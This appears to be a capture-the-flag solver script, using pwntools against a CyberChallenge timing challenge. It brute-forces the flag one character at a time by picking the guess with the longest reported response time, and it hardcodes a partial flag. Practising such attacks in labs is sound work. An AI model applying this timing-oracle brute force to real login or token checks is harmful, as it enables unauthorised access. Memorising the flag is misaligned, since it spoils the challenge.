from pwn import *
from time import time
r = remote ("benchmark.challs.cyberchallenge.it", 9031)
r.recv()
r.sendline(b"prova")
print(r.recv())
r.sendline(b"prova")
print(r.recv())
result = b"CCIT{s1d3_ch4nn3ls_r_c00"
allowed_characters = [char for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_!{"]
#allowed_characters = string.printable
while True:
	dict = {}
	
	for char in allowed_characters:
		print(result + char.encode())
		r.sendline(result + char.encode())
		sleep(1)
		response =r.recv()
		time = response.split()[4]
		print(time)
		if time.isdigit():
			dict[result + char.encode()] = time.decode('utf-8')

		else:
			dict[result + char.encode()] = 0
	max_key = max(dict, key=lambda k: int(dict[k]))
	max_value = dict[max_key]
	print(max_key)
	print(max_value)

	result+=max_key.decode('utf-8')[-1].encode()
	print(result)
	
	

	




	

	
	
	

	

